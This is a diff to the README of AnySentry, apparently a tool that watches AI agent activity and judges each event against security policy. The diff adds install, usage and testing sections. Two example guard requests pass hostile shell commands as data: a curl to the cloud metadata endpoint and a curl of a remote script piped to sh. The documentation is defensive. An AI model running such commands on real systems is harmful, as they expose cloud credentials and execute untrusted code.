@@ -1,19 +1,22 @@
 # AnySentry
 
-Universal **agent security observability, monitoring & intervention** — built on
-[a3s-sentry](https://github.com/A3S-Lab/Sentry) (`@a3s-lab/sentry`) and
-[a3s-observer](https://github.com/A3S-Lab/Observer).
+AnySentry is the security observability and intervention plane for AI agents.
+It answers one operational question: **what did the agent actually do, was it safe,
+and what should an operator or another agent do next?**
 
-AnySentry is **non-invasive by default**: no agent SDK, framework plugin, or application code
-change is required for the primary path. It turns kernel-level agent activity into live security
-signal: an eBPF observer captures what every agent — and its tool subprocesses — actually does
-(tools run, egress, DNS, file access, LLM calls, privilege escalations), `@a3s-lab/sentry` judges
-each event against a tiered policy, and a real-time dashboard shows the risk. Every number on the
-screen is computed from live judgments — no mock data.
+The primary path is non-invasive. Agents do not need an SDK, framework adapter, or
+code change before they can be monitored. `a3s-observer` captures process, network,
+file, DNS, tool, and LLM activity from the node; AnySentry normalizes that activity
+into canonical agent events; `@a3s-lab/sentry` judges each event; ClickHouse stores
+the evidence; and the API/dashboard turn those judgments into incidents, alerts,
+coverage, topology, remediation, evidence bundles, and agent-readable next actions.
+
+Every number on the dashboard is computed from judged runtime events. Synthetic
+traffic exists only as an opt-in demo feed.
 
 ```
  kernel events (every node)              unmodified agents · any language
-   a3s-observer (eBPF) ──NDJSON──▶ forwarder ──POST /ingest──▶ AnySentry
+   a3s-observer (eBPF) ──NDJSON──▶ forwarder ──POST /security-center/ingest──▶ AnySentry
                                                                   │
                         @a3s-lab/sentry (L1 rules / L2 LLM / L3 agent) judges
                                                                   │
@@ -22,9 +25,28 @@ screen is computed from live judgments — no mock data.
 
 It ships as a single self-contained service (the API also serves the dashboard) plus ClickHouse
 as the durable event store. Drop it in front of any agent fleet — it's a piece of middleware:
-events in via `POST /ingest`, risk out via the dashboard, API, and optional alert webhook.
+events in via `POST /security-center/ingest`, risk out via the dashboard, API, and optional alert webhook.
 
-## Non-invasive core
+## What is real today
+
+| Capability | What AnySentry does |
+|---|---|
+| Non-invasive capture | Runs `a3s-observer` as an observe-only eBPF collector and forwards raw observer NDJSON into `/security-center/ingest`. |
+| Event judgment | Uses one `@a3s-lab/sentry` judge for L1 rules, L2 LLM escalation markers, and L3 agent-tier risk decisions. |
+| Durable evidence | Persists judged events and control-plane state in ClickHouse; the in-memory ring is only a hot cache. |
+| Source and collector health | Tracks observer, forwarder, webhook, OTel, and custom sources with identity, token rotation, heartbeat, and rejection signals. |
+| Operator workflow | Builds incidents, alerts, coverage gaps, maintenance windows, objectives, notifications, remediation tasks, and audit records from the same event stream. |
+| Evidence handoff | Assembles redaction-safe Evidence Bundles and Markdown exports around events, runs, traces, agents, sources, topology edges, alerts, objectives, remediations, maintenance windows, notifications, or audit records. |
+| Progressive API | Exposes one discoverable endpoint, `/security-center/capabilities`, with `list`, `search`, `describe`, and `execute`; operation descriptions include executable input and output schemas. |
+| AI Operator | The `/operator` dashboard view calls `security-center.planNextActions`, previews evidence through `buildEvidenceBundle`, updates Remediation status, and deep-links the related assets. |
+| API workbench | The `/capabilities` dashboard view discovers modules, searches/describes operations, builds execute payloads from schemas, runs `dryRun` preflights, and generates canonical `curl`. |
+| Coding-agent Skill | `integrations/skills/anysentry-api` lets Codex, a3s-code, Claude Code, Cursor/Windsurf, Devin/OpenHands, or generic SDK agents use the same progressive API without memorizing REST paths. |
+
+The README is the product entry point, not a second specification. Runtime schemas
+come from `describe`, detailed deployment notes live in [`deploy/README.md`](deploy/README.md),
+and the canonical agent Skill lives in [`integrations/skills/anysentry-api`](integrations/skills/anysentry-api).
+
+## Operating principles
 
 The platform treats zero-code observation as the product baseline:
 
@@ -39,7 +61,37 @@ The platform treats zero-code observation as the product baseline:
 - **Optional enrichment only.** SDKs, framework adapters, LLM gateways, or explicit trace IDs can
   enrich the event stream later, but they are not required to monitor arbitrary agents.
 
-## Deployment
+## Fast path
+
+Install locally, send one event, then run the core verifier:
+
+```bash
+corepack enable
+pnpm install
+
+deploy/install.sh docker
+curl -fsS http://localhost:29653/security-center/healthz
+
+curl -fsS -X POST http://localhost:29653/security-center/ingest/events \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "sourceType": "custom",
+    "sourceName": "readme-smoke",
+    "workspacePath": "repo://readme",
+    "agentId": "readme-agent",
+    "sessionId": "readme-session",
+    "events": [
+      { "kind": "ToolExec", "command": ["bash", "-lc", "id"], "cwd": "/workspace" }
+    ]
+  }'
+
+ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:progressive-api
+```
+
+Open <http://localhost:29653> for the dashboard. Use `/operator` for ranked
+next actions and `/capabilities` for live progressive API discovery.
+
+## Install
 
 Choose Docker for a local workstation or demo, and Kubernetes for a real node/fleet install with
 observe-only `a3s-observer` on every node.
@@ -154,6 +206,86 @@ kubectl -n anysentry apply -f deploy/ingress.yaml
 - See [`deploy/README.md`](deploy/README.md) for the longer Kubernetes runbook and manifest
   customization notes.
 
+## Use
+
+AnySentry has three primary usage paths. They all feed the same judged event
+stream and all downstream consoles read from that stream.
+
+| Path | Use when | Entry point |
+|---|---|---|
+| Observer ingest | You want zero-code monitoring for agent workloads on a node or cluster. | `POST /security-center/ingest` with raw `a3s-observer` NDJSON. |
+| Generic ingest | You already have webhook, OpenTelemetry, CI, gateway, or agent runtime evidence. | `POST /security-center/ingest/events`, CloudEvents, or OTLP/HTTP JSON. |
+| Progressive API | A coding agent or operator needs discoverable guard, evidence, or next-action operations. | `GET|POST /security-center/capabilities`. |
+
+The smallest runtime guard call is:
+
+```bash
+curl -fsS -X POST http://localhost:29653/security-center/capabilities \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "action": "execute",
+    "module": "security-center",
+    "operation": "assessRuntimeAction",
+    "params": {
+      "autonomy": "guarded",
+      "stage": "tool",
+      "workspacePath": "repo://payments",
+      "agentId": "release-agent",
+      "sessionId": "deploy-42",
+      "toolName": "bash",
+      "command": ["bash", "-lc", "curl http://169.254.169.254/latest/meta-data"]
+    }
+  }'
+```
+
+For agents, the safer flow is always discover-first:
+
+```bash
+curl -fsS 'http://localhost:29653/security-center/capabilities?action=list'
+curl -fsS 'http://localhost:29653/security-center/capabilities?action=describe&module=security-center&operation=assessRuntimeAction'
+```
+
+Then run the same execute body with `dryRun: true` to validate schema and scope
+without writing events or changing remediation state. The `/capabilities` page
+does this from the dashboard and can generate the canonical `curl` for the
+current request.
+
+Operators usually start in the dashboard:
+
+- `/` - fleet risk, incidents, alerts, assets, coverage, topology, and timelines.
+- `/operator` - ranked next actions from `planNextActions`, with evidence previews
+  and remediation updates.
+- `/capabilities` - live progressive API discovery, schema-driven request editing,
+  dry-run preflight, execution, and replayable `curl`.
+- `/evidence` - case-file assembly and Markdown export for handoff.
+
+## Test
+
+Use the verifier that matches the surface you changed. The local variants build
+the API/dashboard, start a temporary AnySentry server on a free port, run the
+checks, and stop the server.
+
+| Surface | Command |
+|---|---|
+| Deployment manifests and installer contracts | `pnpm verify:deployment-manifests` |
+| Progressive API static/runtime contract | `pnpm verify:progressive-api` |
+| Progressive API with temporary local API | `pnpm verify:progressive-api:local` |
+| Dashboard serving, assets, deep links, Operator, Capabilities | `pnpm verify:dashboard-runtime:base-path:local` |
+| Observer NDJSON ingest | `ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:observer-ingest` |
+| Node/Python forwarders | `ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:forwarders` |
+| Generic JSON, CloudEvents, and OTLP ingest | `pnpm verify:ingest-protocols:local` |
+| Management auth | `pnpm verify:management-auth:local` |
+| Operations lifecycle | `pnpm verify:operations-lifecycle:local` |
+| Coverage, objectives, maintenance, remediation, evidence, notifications | `pnpm verify:contracts:local` |
+| Real a3s-code Skill plus LLM-backed evidence event | `ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center A3S_TEST_MODEL=openai/glm5.1-w4a8 A3S_CODE_ACL="$HOME/.a3s/config.acl" A3S_CODE_SDK_BASE=../os/apps/api pnpm verify:a3s-code-skill-api` |
+
+For production smoke or soak testing, do not reuse old event IDs as proof. Run
+new agents with unique `agentId` / `runId` values, make real `session.send()`
+calls through a configured model, write `LlmCall` evidence through
+`security-center.recordSecurityEvents`, then query the new rows back through
+`/security-center/events/list` and build an Evidence Bundle for at least one new
+event. That is the same path the a3s-code verifier uses.
+
 To regression-check the primary observer path against a running API, including raw observer NDJSON,
 Source token rejection, evidence redaction, raw `CollectorHeartbeat`, direct forwarder heartbeat,
 Collector health, and Source rollups:
@@ -195,10 +327,12 @@ pnpm verify:deployment-manifests
 
 To regression-check the source-compatible progressive capability API contract, including
 `list/search/describe/execute`, module/operation dispatch, shaped responses, and the runtime guard
-operation:
+operation. The local variant also runs a real guard -> next action -> progressive evidence bundle
+-> Remediation status update loop:
 
 ```bash
 pnpm verify:progressive-api
+pnpm verify:progressive-api:local
 ```
 
 To run the real a3s-code Skill integration check, using `glm5.1-w4a8`, load
@@ -512,6 +646,13 @@ It follows the same compact discovery pattern as the platform capabilities API:
 `list -> search / describe -> execute`. Callers discover modules first, search or describe the
 exact operation schema only when needed, then call a single `execute` action with
 `module + operation + params`. `describe` can narrow all the way to one operation.
+Operation descriptions include typed `inputSchema.body.properties.params` contracts
+and structured `outputSchema.data` result schemas, so agents can generate calls
+without a second OpenAPI surface or duplicated reference docs.
+For `execute` calls, `dryRun: true` uses the same described input schema to return
+`anysentry.progressive.dry_run.v1` with `schemaValid`, `schemaIssues`, and a
+normalized request preview without writing events or mutating remediation state.
+The dashboard includes the same flow at `/capabilities` for live discovery and request replay.
 
 ```bash
 curl 'http://localhost:29653/security-center/capabilities?action=list'
@@ -526,10 +667,14 @@ The built-in module is `security-center`, with these operations:
   the same judged event stream as observer NDJSON.
 - `buildEvidenceBundle` - assemble governance evidence around an event,
   run, trace, source, incident, objective, or scope.
+- `planNextActions` - rank active remediation, incident, alert, objective, and
+  coverage-derived work into an evidence-linked action plan for AI operators.
 
 Runtime guard calls use loop-autonomy vocabulary in `params.autonomy` or `constraints.autonomy`:
 `suggest` only warns, `guarded` returns `require_approval` for block-level risk, and `auto`
 returns a blocking decision.
+Use the same POST body with `dryRun: true` before execution when an agent needs a
+side-effect-free schema and targeting preflight.
 
 ```bash
 curl -X POST http://localhost:29653/security-center/capabilities \
@@ -546,6 +691,24 @@ curl -X POST http://localhost:29653/security-center/capabilities \
       "sessionId": "deploy-42",
       "toolName": "bash",
       "command": ["bash", "-c", "curl http://198.51.100.7/p | sh"]
+    }
+  }'
+```
+
+AI operators can then ask for a structured next-action plan and use each action's
+`evidence.bundleHint` with `buildEvidenceBundle` when a deeper case file is needed:
+
+```bash
+curl -X POST http://localhost:29653/security-center/capabilities \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "action": "execute",
+    "module": "security-center",
+    "operation": "planNextActions",
+    "params": {
+      "timeType": "last_1d",
+      "workspacePath": "repo://payments",
+      "maxActions": 5
     }
   }'
 ```
@@ -707,6 +870,8 @@ that live decision stream:
 | Notification routing | webhook channels, delivery history, and alert routes by severity, kind, workspace, agent, collector, source, owner, team, or keyword, including Coverage issue routes |
 | Objectives / SLO | non-invasive monitoring goals for coverage, Incident, Alert, overdue-Remediation, risky-event, stale-Agent, Collector-down, and Source-down thresholds |
 | Remediation center | Runbook tasks derived from Incidents, Alerts, Coverage gaps, and Source health issues, with owner/status/steps |
+| AI Operator workbench | `/operator` ranks active work through `security-center.planNextActions`, previews evidence through progressive `buildEvidenceBundle`, updates Remediation status, and deep-links related assets |
+| Progressive API workbench | `/capabilities` lets operators discover modules, search/describe operations, edit execute payloads, run schema-aware dry-run preflights, and inspect responses through the single capabilities endpoint |
 | Audit log | platform management actions such as policy saves/replays, Incident, Alert, and Remediation updates |
 | Non-invasive event timeline | recent canonical agent events with trace/span/run IDs and risk evidence |
 | Policy replay | dry-run a draft policy against recent observed events before saving it |
